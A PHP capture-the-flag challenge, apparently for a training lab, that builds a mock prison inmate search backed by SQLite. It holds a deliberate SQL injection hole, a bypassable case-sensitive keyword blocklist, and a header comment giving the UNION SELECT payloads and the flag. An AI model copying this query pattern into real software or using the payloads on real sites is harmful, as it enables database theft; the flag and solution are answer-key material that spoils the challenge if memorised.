<?php
/*
 * UNION-Based SQL Injection with Filter Bypass 
 * 
 * Server Room B
 * Theme: Prison escape — Fox River Penitentiary
 *
 * VULNERABILITY:
 *   The search form concatenates user input directly into a SQL query.
 *   A basic keyword blocklist filters exact-case "UNION" and "SELECT",
 *   but can be bypassed with mixed case (e.g., "UniOn", "SeLeCt").
 *
 * SOLUTION PATH:
 *   Step 1 — Find column count:
 *     ' ORDER BY 5--        (works)
 *     ' ORDER BY 6--        (errors → 5 columns)
 *
 *   Step 2 — Discover tables:
 *     ' uNiOn sElEcT name,type,sql,NULL,NULL FROM sqlite_master--
 *
 *   Step 3 — Extract the flag:
 *     ' uNiOn sElEcT flag,hint,NULL,NULL,NULL FROM esc4pe_pl4n--
 */


$dbPath = __DIR__ . '/ctf.db';
$firstRun = !file_exists($dbPath);

try {
    $db = new PDO('sqlite:' . $dbPath);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}

if ($firstRun) {
    $db->exec("CREATE TABLE inmates (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        cell_block TEXT NOT NULL,
        years_remaining INTEGER NOT NULL,
        offense TEXT NOT NULL
    )");

    $inmates = [
        ["Fernando Sucre",              "Block A",   5, "Armed Robbery"],
        ["Michael Scofield",            "Block A",   5, "Armed Robbery"],
        ["Lincoln Burrows",             "Block A",  99, "Murder"],
        ["Theodore 'T-Bag' Bagwell",    "Block B",  60, "Kidnapping and Murder"],
        ["C-Note",                      "Block C",   8, "Distribution"],
        ["David 'Tweener' Apolskis",    "Block C",   3, "Grand Theft Auto"],
        ["John Abruzzi",                "Block D",  25, "Racketeering"],
        ["Charles 'Haywire' Patoshik",  "Block D",  40, "Murder"],
        ["Charles Westmoreland",        "Block B",  60, "Manslaughter"],
    ];
    $stmt = $db->prepare("INSERT INTO inmates (name, cell_block, years_remaining, offense) VALUES (?, ?, ?, ?)");
    foreach ($inmates as $row) {
        $stmt->execute($row);
    }

    $db->exec("CREATE TABLE esc4pe_pl4n (
        id INTEGER PRIMARY KEY,
        flag TEXT NOT NULL,
        hint TEXT NOT NULL
    )");
    $db->prepare("INSERT INTO esc4pe_pl4n (flag, hint) VALUES (?, ?)")->execute([
        "PrisonCTF{br0ke_0ut_of_c3ll_bl0ck_2}",
        "The cell door swings open. You've escaped the prison."
    ]);
}

$BLOCKED_KEYWORDS = ["UNION", "SELECT", "DROP", "DELETE", "INSERT", "UPDATE"];

function check_filter($input, $blocked) {
    foreach ($blocked as $kw) {
        //case sensitive
        if (strpos($input, $kw) !== false) {
            return $kw;
        }
	if (strpos($input, strtolower($kw)) !== false) {
	    return strtolower($kw);
	}
    }
    return null;
}

//handle search
$query = isset($_GET['q']) ? trim($_GET['q']) : '';
$results = null;
$columns = [];
$blocked_keyword = null;
$error = null;

if ($query !== '') {
    $blocked_keyword = check_filter($query, $BLOCKED_KEYWORDS);
    if ($blocked_keyword) {
        $results = [];
    } else {
        
        $sql = "SELECT name, cell_block, years_remaining, offense, id FROM inmates WHERE name LIKE '%" . $query . "%'";

        try {
            $stmt = $db->query($sql);
            $results = $stmt->fetchAll(PDO::FETCH_NUM);
            for ($i = 0; $i < $stmt->columnCount(); $i++) {
                $meta = $stmt->getColumnMeta($i);
                $columns[] = $meta['name'];
            }
        } catch (PDOException $e) {
            $results = [];
            $error = $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fox River Penitentiary — Inmate Registry</title>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:        #0a0a0c;
    --surface:   #141418;
    --border:    #252530;
    --accent:    #e84a30;
    --accent-dim:#e84a3022;
    --text:      #9a9aab;
    --text-bright:#d4d4e0;
    --danger:    #ff4d6a;
    --warn:      #f5a623;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'IBM Plex Mono', monospace;
    min-height: 100vh;
  }

  body::after {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,0,0,0.12) 2px,
      rgba(0,0,0,0.12) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  .container {
    max-width: 960px;
    margin: 0 auto;
    padding: 2rem 1.5rem;
  }

  .header {
    border-bottom: 1px solid var(--border);
    padding-bottom: 1.5rem;
    margin-bottom: 2rem;
  }
  .header h1 {
    font-family: 'Space Grotesk', sans-serif;
    font-size: 1.6rem;
    font-weight: 700;
    color: var(--text-bright);
    letter-spacing: -0.02em;
  }
  .header h1 span { color: var(--accent); }
  .header .subtitle {
    font-size: 0.75rem;
    color: #4a4a5a;
    margin-top: 0.3rem;
    text-transform: uppercase;
    letter-spacing: 0.1em;
  }

  .search-box {
    display: flex;
    gap: 0.5rem;
    margin-bottom: 1.5rem;
  }
  .search-box input {
    flex: 1;
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text-bright);
    font-family: 'IBM Plex Mono', monospace;
    font-size: 0.9rem;
    padding: 0.7rem 1rem;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s;
  }
  .search-box input:focus { border-color: var(--accent); }
  .search-box input::placeholder { color: #33333f; }
  .search-box button {
    background: var(--accent);
    border: none;
    color: #fff;
    font-family: 'IBM Plex Mono', monospace;
    font-weight: 600;
    font-size: 0.85rem;
    padding: 0 1.4rem;
    border-radius: 4px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    transition: opacity 0.15s;
  }
  .search-box button:hover { opacity: 0.85; }

  .alert {
    padding: 0.7rem 1rem;
    border-radius: 4px;
    font-size: 0.8rem;
    margin-bottom: 1.2rem;
    border-left: 3px solid;
  }
  .alert-blocked {
    background: rgba(255,77,106,0.08);
    border-color: var(--danger);
    color: var(--danger);
  }
  .alert-error {
    background: rgba(245,166,35,0.08);
    border-color: var(--warn);
    color: var(--warn);
  }
  .alert-info {
    background: var(--accent-dim);
    border-color: var(--accent);
    color: var(--accent);
  }

  .results-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.82rem;
  }
  .results-table th {
    text-align: left;
    padding: 0.6rem 0.8rem;
    color: var(--accent);
    font-weight: 500;
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    border-bottom: 1px solid var(--border);
    background: var(--surface);
  }
  .results-table td {
    padding: 0.55rem 0.8rem;
    border-bottom: 1px solid var(--border);
    color: var(--text);
  }
  .results-table tr:hover td {
    background: rgba(232,74,48,0.04);
  }

  .empty {
    text-align: center;
    padding: 3rem 1rem;
    color: #33333f;
    font-size: 0.85rem;
  }

  .footer {
    margin-top: 3rem;
    padding-top: 1rem;
    border-top: 1px solid var(--border);
    font-size: 0.65rem;
    color: #2a2a35;
    text-align: center;
  }
</style>
</head>
<body>
<div class="container">

  <div class="header">
    <h1><span>&#9638;</span>Fox River Penitentiary</h1>
    <div class="subtitle">Inmate Registry System &mdash; RESTRICTED ACCESS &mdash; v3.1.0</div>
  </div>

  <form class="search-box" method="GET" action="index.php">
    <input type="text" name="q" placeholder="Search inmates by name..." value="<?= htmlspecialchars($query, ENT_QUOTES) ?>" autocomplete="off">
    <button type="submit">Search</button>
  </form>

  <?php if ($blocked_keyword): ?>
    <div class="alert alert-blocked">
      &#9940; Security filter triggered: blocked keyword "<strong><?= htmlspecialchars($blocked_keyword, ENT_QUOTES) ?></strong>" detected. Nice try, inmate.
    </div>
  <?php endif; ?>

  <?php if ($error): ?>
    <div class="alert alert-error">
      &#9888; Database error: <?= htmlspecialchars($error, ENT_QUOTES) ?>
    </div>
  <?php endif; ?>

  <?php if ($results !== null): ?>
    <?php if (count($results) > 0): ?>
      <div class="alert alert-info">
        <?= count($results) ?> record(s) found.
      </div>
      <table class="results-table">
        <thead>
          <tr>
            <?php foreach ($columns as $col): ?>
              <th><?= htmlspecialchars($col, ENT_QUOTES) ?></th>
            <?php endforeach; ?>
          </tr>
        </thead>
        <tbody>
          <?php foreach ($results as $row): ?>
            <tr>
              <?php foreach ($row as $cell): ?>
                <td><?= htmlspecialchars($cell ?? '', ENT_QUOTES) ?></td>
              <?php endforeach; ?>
            </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    <?php else: ?>
      <div class="empty">No inmates found matching your query.</div>
    <?php endif; ?>
  <?php else: ?>
    <div class="empty">Enter a name above to search the inmate registry.</div>
  <?php endif; ?>

  <div class="footer">
    &copy; 2024 Fox River Penitentiary &mdash; Department of Corrections &bull; Authorized personnel only
  </div>

</div>
</body>
</html>
